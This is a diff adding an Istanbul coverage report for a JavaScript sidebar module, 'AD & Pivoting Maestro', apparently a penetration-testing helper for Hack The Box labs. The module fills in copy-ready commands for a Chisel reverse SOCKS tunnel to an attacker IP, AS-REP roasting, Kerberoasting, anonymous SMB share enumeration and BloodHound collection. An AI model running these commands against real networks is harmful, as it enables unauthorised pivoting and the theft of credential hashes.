@@ -1,0 +1,346 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>
+    <title>Code coverage report for ui/ADPivotPanel.js</title>
+    <meta charset="utf-8" />
+    <link rel="stylesheet" href="../prettify.css" />
+    <link rel="stylesheet" href="../base.css" />
+    <link rel="shortcut icon" type="image/x-icon" href="../favicon.png" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type='text/css'>
+        .coverage-summary .sorter {
+            background-image: url(../sort-arrow-sprite.png);
+        }
+    </style>
+</head>
+    
+<body>
+<div class='wrapper'>
+    <div class='pad1'>
+        <h1><a href="../index.html">All files</a> / <a href="index.html">ui</a> ADPivotPanel.js</h1>
+        <div class='clearfix'>
+            
+            <div class='fl pad1y space-right2'>
+                <span class="strong">0% </span>
+                <span class="quiet">Statements</span>
+                <span class='fraction'>0/15</span>
+            </div>
+        
+            
+            <div class='fl pad1y space-right2'>
+                <span class="strong">0% </span>
+                <span class="quiet">Branches</span>
+                <span class='fraction'>0/6</span>
+            </div>
+        
+            
+            <div class='fl pad1y space-right2'>
+                <span class="strong">0% </span>
+                <span class="quiet">Functions</span>
+                <span class='fraction'>0/3</span>
+            </div>
+        
+            
+            <div class='fl pad1y space-right2'>
+                <span class="strong">0% </span>
+                <span class="quiet">Lines</span>
+                <span class='fraction'>0/15</span>
+            </div>
+        
+            
+        </div>
+        <p class="quiet">
+            Press <em>n</em> or <em>j</em> to go to the next uncovered block, <em>b</em>, <em>p</em> or <em>k</em> for the previous block.
+        </p>
+        <template id="filterTemplate">
+            <div class="quiet">
+                Filter:
+                <input type="search" id="fileSearch">
+            </div>
+        </template>
+    </div>
+    <div class='status-line low'></div>
+    <pre><table class="coverage">
+<tr><td class="line-count quiet"><a name='L1'></a><a href='#L1'>1</a>
+<a name='L2'></a><a href='#L2'>2</a>
+<a name='L3'></a><a href='#L3'>3</a>
+<a name='L4'></a><a href='#L4'>4</a>
+<a name='L5'></a><a href='#L5'>5</a>
+<a name='L6'></a><a href='#L6'>6</a>
+<a name='L7'></a><a href='#L7'>7</a>
+<a name='L8'></a><a href='#L8'>8</a>
+<a name='L9'></a><a href='#L9'>9</a>
+<a name='L10'></a><a href='#L10'>10</a>
+<a name='L11'></a><a href='#L11'>11</a>
+<a name='L12'></a><a href='#L12'>12</a>
+<a name='L13'></a><a href='#L13'>13</a>
+<a name='L14'></a><a href='#L14'>14</a>
+<a name='L15'></a><a href='#L15'>15</a>
+<a name='L16'></a><a href='#L16'>16</a>
+<a name='L17'></a><a href='#L17'>17</a>
+<a name='L18'></a><a href='#L18'>18</a>
+<a name='L19'></a><a href='#L19'>19</a>
+<a name='L20'></a><a href='#L20'>20</a>
+<a name='L21'></a><a href='#L21'>21</a>
+<a name='L22'></a><a href='#L22'>22</a>
+<a name='L23'></a><a href='#L23'>23</a>
+<a name='L24'></a><a href='#L24'>24</a>
+<a name='L25'></a><a href='#L25'>25</a>
+<a name='L26'></a><a href='#L26'>26</a>
+<a name='L27'></a><a href='#L27'>27</a>
+<a name='L28'></a><a href='#L28'>28</a>
+<a name='L29'></a><a href='#L29'>29</a>
+<a name='L30'></a><a href='#L30'>30</a>
+<a name='L31'></a><a href='#L31'>31</a>
+<a name='L32'></a><a href='#L32'>32</a>
+<a name='L33'></a><a href='#L33'>33</a>
+<a name='L34'></a><a href='#L34'>34</a>
+<a name='L35'></a><a href='#L35'>35</a>
+<a name='L36'></a><a href='#L36'>36</a>
+<a name='L37'></a><a href='#L37'>37</a>
+<a name='L38'></a><a href='#L38'>38</a>
+<a name='L39'></a><a href='#L39'>39</a>
+<a name='L40'></a><a href='#L40'>40</a>
+<a name='L41'></a><a href='#L41'>41</a>
+<a name='L42'></a><a href='#L42'>42</a>
+<a name='L43'></a><a href='#L43'>43</a>
+<a name='L44'></a><a href='#L44'>44</a>
+<a name='L45'></a><a href='#L45'>45</a>
+<a name='L46'></a><a href='#L46'>46</a>
+<a name='L47'></a><a href='#L47'>47</a>
+<a name='L48'></a><a href='#L48'>48</a>
+<a name='L49'></a><a href='#L49'>49</a>
+<a name='L50'></a><a href='#L50'>50</a>
+<a name='L51'></a><a href='#L51'>51</a>
+<a name='L52'></a><a href='#L52'>52</a>
+<a name='L53'></a><a href='#L53'>53</a>
+<a name='L54'></a><a href='#L54'>54</a>
+<a name='L55'></a><a href='#L55'>55</a>
+<a name='L56'></a><a href='#L56'>56</a>
+<a name='L57'></a><a href='#L57'>57</a>
+<a name='L58'></a><a href='#L58'>58</a>
+<a name='L59'></a><a href='#L59'>59</a>
+<a name='L60'></a><a href='#L60'>60</a>
+<a name='L61'></a><a href='#L61'>61</a>
+<a name='L62'></a><a href='#L62'>62</a>
+<a name='L63'></a><a href='#L63'>63</a>
+<a name='L64'></a><a href='#L64'>64</a>
+<a name='L65'></a><a href='#L65'>65</a>
+<a name='L66'></a><a href='#L66'>66</a>
+<a name='L67'></a><a href='#L67'>67</a>
+<a name='L68'></a><a href='#L68'>68</a>
+<a name='L69'></a><a href='#L69'>69</a>
+<a name='L70'></a><a href='#L70'>70</a>
+<a name='L71'></a><a href='#L71'>71</a>
+<a name='L72'></a><a href='#L72'>72</a>
+<a name='L73'></a><a href='#L73'>73</a>
+<a name='L74'></a><a href='#L74'>74</a>
+<a name='L75'></a><a href='#L75'>75</a>
+<a name='L76'></a><a href='#L76'>76</a>
+<a name='L77'></a><a href='#L77'>77</a>
+<a name='L78'></a><a href='#L78'>78</a>
+<a name='L79'></a><a href='#L79'>79</a>
+<a name='L80'></a><a href='#L80'>80</a>
+<a name='L81'></a><a href='#L81'>81</a>
+<a name='L82'></a><a href='#L82'>82</a>
+<a name='L83'></a><a href='#L83'>83</a>
+<a name='L84'></a><a href='#L84'>84</a>
+<a name='L85'></a><a href='#L85'>85</a>
+<a name='L86'></a><a href='#L86'>86</a>
+<a name='L87'></a><a href='#L87'>87</a>
+<a name='L88'></a><a href='#L88'>88</a></td><td class="line-coverage quiet"><span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-no">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span>
+<span class="cline-any cline-neutral">&nbsp;</span></td><td class="text"><pre class="prettyprint lang-js">export const ADPivotPanel = <span class="cstat-no" title="statement not covered" >{</span>
+  callbacks: {},
+&nbsp;
+<span class="fstat-no" title="function not covered" >  init(</span>callbacks) {
+<span class="cstat-no" title="statement not covered" >    this.callbacks = callbacks;</span>
+  },
+&nbsp;
+<span class="fstat-no" title="function not covered" >  renderSidebar(</span>container) {
+<span class="cstat-no" title="statement not covered" >    container.innerHTML = `</span>
+      &lt;div style="display: flex; flex-direction: column; height: 100%; padding: 10px; box-sizing: border-box; background: var(--bg-primary); color: var(--text-primary); overflow-y: auto;"&gt;
+        &lt;div style="margin-bottom: 10px;"&gt;
+          &lt;h3 style="margin: 0 0 5px 0; font-size: 1.1em; color: var(--accent);"&gt;AD &amp; Pivoting Maestro&lt;/h3&gt;
+          &lt;p style="margin: 0; font-size: 0.8em; color: var(--text-status);"&gt;Generate tunnels and AD commands.&lt;/p&gt;
+        &lt;/div&gt;
+&nbsp;
+        &lt;!-- IP Configuration --&gt;
+        &lt;div style="margin-bottom: 15px; padding: 10px; background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 4px;"&gt;
+          &lt;div style="margin-bottom: 5px; display: flex; align-items: center; gap: 5px;"&gt;
+            &lt;label style="font-size: 0.8em; font-weight: bold; width: 80px;"&gt;Attacker IP:&lt;/label&gt;
+            &lt;input type="text" id="ad-attacker-ip" value="10.10.14.X" style="flex: 1; padding: 4px; background: var(--bg-primary); color: var(--text-primary); border: 1px solid var(--border-dark); font-family: monospace;" /&gt;
+          &lt;/div&gt;
+          &lt;div style="margin-bottom: 5px; display: flex; align-items: center; gap: 5px;"&gt;
+            &lt;label style="font-size: 0.8em; font-weight: bold; width: 80px;"&gt;Victim IP:&lt;/label&gt;
+            &lt;input type="text" id="ad-victim-ip" value="10.10.10.X" style="flex: 1; padding: 4px; background: var(--bg-primary); color: var(--text-primary); border: 1px solid var(--border-dark); font-family: monospace;" /&gt;
+          &lt;/div&gt;
+          &lt;div style="display: flex; align-items: center; gap: 5px;"&gt;
+            &lt;label style="font-size: 0.8em; font-weight: bold; width: 80px;"&gt;Domain:&lt;/label&gt;
+            &lt;input type="text" id="ad-domain" value="HTB.LOCAL" style="flex: 1; padding: 4px; background: var(--bg-primary); color: var(--text-primary); border: 1px solid var(--border-dark); font-family: monospace;" /&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+&nbsp;
+        &lt;!-- Pivoting Section --&gt;
+        &lt;h4 style="margin: 10px 0 5px 0; color: var(--accent); border-bottom: 1px solid var(--border-color); padding-bottom: 3px;"&gt;1. Pivoting (Chisel)&lt;/h4&gt;
+        &lt;div style="font-size: 0.85em; font-family: monospace; background: var(--bg-secondary); padding: 8px; border: 1px solid var(--border-color); border-radius: 4px; margin-bottom: 15px;"&gt;
+          &lt;div style="color: var(--text-status); font-weight: bold; margin-bottom: 3px;"&gt;Attacker (Kali):&lt;/div&gt;
+          &lt;div id="ad-chisel-server" style="user-select: all; cursor: pointer; color: #89d185;"&gt;chisel server -p 8000 --reverse&lt;/div&gt;
+          &lt;div style="color: var(--text-status); font-weight: bold; margin-top: 8px; margin-bottom: 3px;"&gt;Victim (Target):&lt;/div&gt;
+          &lt;div id="ad-chisel-client" style="user-select: all; cursor: pointer; color: #89d185;"&gt;./chisel client 10.10.14.X:8000 R:socks&lt;/div&gt;
+          &lt;div style="color: var(--text-status); font-weight: bold; margin-top: 8px; margin-bottom: 3px;"&gt;Proxychains (/etc/proxychains4.conf):&lt;/div&gt;
+          &lt;div style="user-select: all; cursor: pointer; color: #89d185;"&gt;socks5 127.0.0.1 1080&lt;/div&gt;
+        &lt;/div&gt;
+&nbsp;
+        &lt;!-- Active Directory Section --&gt;
+        &lt;h4 style="margin: 10px 0 5px 0; color: var(--accent); border-bottom: 1px solid var(--border-color); padding-bottom: 3px;"&gt;2. Active Directory&lt;/h4&gt;
+        &lt;div style="font-size: 0.85em; font-family: monospace; background: var(--bg-secondary); padding: 8px; border: 1px solid var(--border-color); border-radius: 4px; margin-bottom: 15px; display: flex; flex-direction: column; gap: 8px;"&gt;
+          
+          &lt;div&gt;
+            &lt;div style="color: var(--text-status); font-weight: bold; margin-bottom: 2px;"&gt;AS-REP Roasting (Impacket)&lt;/div&gt;
+            &lt;div id="ad-asrep" style="user-select: all; cursor: pointer; color: #89d185;"&gt;impacket-GetNPUsers HTB.LOCAL/ -dc-ip 10.10.10.X -request&lt;/div&gt;
+          &lt;/div&gt;
+          
+          &lt;div&gt;
+            &lt;div style="color: var(--text-status); font-weight: bold; margin-bottom: 2px;"&gt;Kerberoasting (Impacket)&lt;/div&gt;
+            &lt;div id="ad-kerb" style="user-select: all; cursor: pointer; color: #89d185;"&gt;impacket-GetUserSPNs -request -dc-ip 10.10.10.X HTB.LOCAL/user:pass&lt;/div&gt;
+          &lt;/div&gt;
+&nbsp;
+          &lt;div&gt;
+            &lt;div style="color: var(--text-status); font-weight: bold; margin-bottom: 2px;"&gt;NetExec (SMB Enum)&lt;/div&gt;
+            &lt;div id="ad-nxc" style="user-select: all; cursor: pointer; color: #89d185;"&gt;nxc smb 10.10.10.X -u '' -p '' --shares&lt;/div&gt;
+          &lt;/div&gt;
+&nbsp;
+          &lt;div&gt;
+            &lt;div style="color: var(--text-status); font-weight: bold; margin-bottom: 2px;"&gt;BloodHound (Python)&lt;/div&gt;
+            &lt;div id="ad-bh" style="user-select: all; cursor: pointer; color: #89d185;"&gt;bloodhound-python -u user -p pass -ns 10.10.10.X -d HTB.LOCAL -c all&lt;/div&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+&nbsp;
+      &lt;/div&gt;
+    `;
+&nbsp;
+    const updateCommands = <span class="cstat-no" title="statement not covered" ><span class="fstat-no" title="function not covered" >()</span> =&gt; {</span>
+      const attacker = <span class="cstat-no" title="statement not covered" >document.getElementById('ad-attacker-ip').value || '10.10.14.X';</span>
+      const victim = <span class="cstat-no" title="statement not covered" >document.getElementById('ad-victim-ip').value || '10.10.10.X';</span>
+      const domain = <span class="cstat-no" title="statement not covered" >document.getElementById('ad-domain').value || 'HTB.LOCAL';</span>
+&nbsp;
+<span class="cstat-no" title="statement not covered" >      document.getElementById('ad-chisel-client').innerText = `./chisel client ${attacker}:8000 R:socks`;</span>
+<span class="cstat-no" title="statement not covered" >      document.getElementById('ad-asrep').innerText = `impacket-GetNPUsers ${domain}/ -dc-ip ${victim} -request`;</span>
+<span class="cstat-no" title="statement not covered" >      document.getElementById('ad-kerb').innerText = `impacket-GetUserSPNs -request -dc-ip ${victim} ${domain}/user:pass`;</span>
+<span class="cstat-no" title="statement not covered" >      document.getElementById('ad-nxc').innerText = `nxc smb ${victim} -u '' -p '' --shares`;</span>
+<span class="cstat-no" title="statement not covered" >      document.getElementById('ad-bh').innerText = `bloodhound-python -u user -p pass -ns ${victim} -d ${domain} -c all`;</span>
+    };
+&nbsp;
+<span class="cstat-no" title="statement not covered" >    document.getElementById('ad-attacker-ip').addEventListener('input', updateCommands);</span>
+<span class="cstat-no" title="statement not covered" >    document.getElementById('ad-victim-ip').addEventListener('input', updateCommands);</span>
+<span class="cstat-no" title="statement not covered" >    document.getElementById('ad-domain').addEventListener('input', updateCommands);</span>
+  }
+};
+&nbsp;</pre></td></tr></table></pre>
+
+                <div class='push'></div><!-- for sticky footer -->
+            </div><!-- /wrapper -->
+            <div class='footer quiet pad2 space-top1 center small'>
+                Code coverage generated by
+                <a href="https://istanbul.js.org/" target="_blank" rel="noopener noreferrer">istanbul</a>
+                at 2026-08-22T06:11:44.458Z
+            </div>
+        <script src="../prettify.js"></script>
+        <script>
+            window.onload = function () {
+                prettyPrint();
+            };
+        </script>
+        <script src="../sorter.js"></script>
+        <script src="../block-navigation.js"></script>
+    </body>
+</html>
+    
